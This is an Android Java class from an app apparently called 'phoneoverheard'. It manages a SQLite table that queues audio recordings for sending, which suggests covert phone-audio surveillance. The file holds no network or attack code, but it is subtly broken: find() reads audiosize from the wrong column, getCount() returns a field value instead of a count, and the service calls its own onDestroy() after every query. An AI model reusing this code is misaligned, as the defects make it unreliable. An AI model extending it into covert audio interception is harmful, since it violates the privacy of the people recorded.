package com.phoneoverheard.database;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

import android.annotation.SuppressLint;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.os.IBinder;

@SuppressLint("SimpleDateFormat")
public class SendaudioService extends Service {
    @SuppressWarnings("unused")
	private static final String TAG = "sendaudioService";   
    private DatabaseHelper SendaudioDatabasehelper; 
	Date date = new Date(System.currentTimeMillis());
	SimpleDateFormat Dateformat = new SimpleDateFormat("yyyyMMddHHmmss");
	String receiveTime = Dateformat.format(date);
	@Override
	public IBinder onBind(Intent arg0) {
		return null;
	}
	
	public SendaudioService(Context context){
		this.SendaudioDatabasehelper = new DatabaseHelper(context);
	}


	public  void close() {
		if (SendaudioDatabasehelper != null) {
			SendaudioDatabasehelper.close();
		}
	}
	
	@Override
	public void onDestroy() {
		super.onDestroy();
		if (SendaudioDatabasehelper != null) {
			SendaudioDatabasehelper.close();
		}
	}
	
	/**
     *向音频发送表中插入数据
     * @param sendaudio 
     * @return 无           
     */
    public void insert (Sendaudio sendaudio){ 
    	SQLiteDatabase db = SendaudioDatabasehelper.getWritableDatabase();
    	db.execSQL("insert into sendaudio(sendstate,audiosize,datetime,audiourl,audioname) values(?,?,?,?,?)",
    			new Object[]{ sendaudio.getSendstate(),sendaudio.getAudiosize(),sendaudio.getDatetime(),sendaudio.getAudiourl(),sendaudio.getAudioname()});
    	db.close();
    	close();
    	onDestroy();
    }
    
	/**
     *从音频发送表中删除数据
     * @param smskey 
     * @return 无
     */
    public void delete (int sendstate){ 
    	SQLiteDatabase db = SendaudioDatabasehelper.getWritableDatabase();
    	db.execSQL("delete from sendaudio where sendstate=?", new Object[]{sendstate});
    	db.close();
    	close();
    	onDestroy();
    }
    
	/**
     *修改音频发送表中数据
     * @param sendaudio 
     * @return 无
     */
    public void update (String audioname,int sendstate){ 
    	SQLiteDatabase db = SendaudioDatabasehelper.getWritableDatabase();
    	db.execSQL("update sendaudio set sendstate=? where audioname=?",
    			new Object[]{sendstate,audioname});
    	db.close();
    	close();
    	onDestroy();
    }

	/**
     *查找音频发送表中某条 数据
     * @param sendaudio 
     * @return 无     
     */
    public  List<Sendaudio>  find (int sendstate){ 
    	List<Sendaudio> sendaudio = new ArrayList<Sendaudio>();
    	SQLiteDatabase db = SendaudioDatabasehelper.getReadableDatabase();
    	Cursor sendaudioCursor = db.rawQuery("select * from sendaudio where sendstate=?", new String[]{sendstate+""});
    	while(sendaudioCursor.moveToNext()){
    		int audiosize = sendaudioCursor.getInt(sendaudioCursor.getColumnIndex("sendstate"));
    		String datetime = sendaudioCursor.getString(sendaudioCursor.getColumnIndex("datetime"));
    		String audiourl = sendaudioCursor.getString(sendaudioCursor.getColumnIndex("audiourl"));
    		String audioname = sendaudioCursor.getString(sendaudioCursor.getColumnIndex("audioname"));
    		sendaudio.add(new Sendaudio(sendstate,audiosize,datetime,audiourl,audioname));
    	}
    	if(sendaudioCursor != null){
    		sendaudioCursor.close();
    	}
    	db.close();
    	close();
    	onDestroy();
		return sendaudio;
    }
    
	/**
     *查询音频发送表中记录总数
     * @param 无
     * @return result 记录总数
     */
    public Long getCount (int sendstate){ 
    	SQLiteDatabase db = SendaudioDatabasehelper.getReadableDatabase();
    	Cursor sendaudioCursor = db.rawQuery("select * from sendaudio where sendstate=?", new String[]{sendstate+""});
    	sendaudioCursor.moveToFirst();
    	long result = sendaudioCursor.getLong(0);
    	if(sendaudioCursor != null){
    		sendaudioCursor.close();
    	}
    	db.close();
    	close();
    	onDestroy();
		return result;
    }
}
